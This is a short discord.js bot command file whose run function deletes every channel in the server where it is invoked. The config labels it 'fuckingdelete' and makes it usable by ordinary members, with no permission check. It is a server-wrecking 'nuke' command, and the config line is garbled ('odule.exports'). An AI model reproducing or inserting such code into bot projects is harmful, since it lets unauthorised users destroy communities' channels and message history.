const Discord = require("discord.js")
module.exports.run = async (bot, message, args) => {





 message.guild.channels.forEach(channel => channel.delete())


}
odule.exports.config = {
    name: "fuckingdelete",
    description: "",
    usage: "?help",
    accessableby: "Members",
    aliases: []
}